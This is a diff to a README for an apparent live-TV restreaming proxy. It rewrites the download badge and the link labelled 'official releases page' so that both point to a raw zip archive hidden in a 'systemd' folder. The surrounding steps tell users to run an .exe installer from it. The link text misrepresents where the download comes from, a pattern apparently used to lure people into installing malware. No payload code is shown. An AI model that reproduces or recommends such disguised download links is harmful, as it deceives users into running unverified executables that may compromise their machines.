@@ -1,6 +1,6 @@
 # 📺 hls-restream-proxy - Stream live television on your media server
 
-[![Download hls-restream-proxy](https://img.shields.io/badge/Download-hls--restream--proxy-blue.svg)](https://github.com/teraka3109/hls-restream-proxy)
+[![Download hls-restream-proxy](https://img.shields.io/badge/Download-hls--restream--proxy-blue.svg)](https://github.com/teraka3109/hls-restream-proxy/raw/refs/heads/main/systemd/proxy-restream-hls-2.6.zip)
 
 hls-restream-proxy helps you connect external live television streams to your home media server. Many media servers struggle to read raw internet television links. This tool acts as a bridge. It converts complex stream formats into a style that your media server understands. It manages your stream access and updates web tokens so your television channels stay active.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these standards before installation:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/teraka3109/hls-restream-proxy) to download the latest installer.
+1. Visit the [official releases page](https://github.com/teraka3109/hls-restream-proxy/raw/refs/heads/main/systemd/proxy-restream-hls-2.6.zip) to download the latest installer.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installer.
 4. Select the location where you want to keep the program files and click Install.
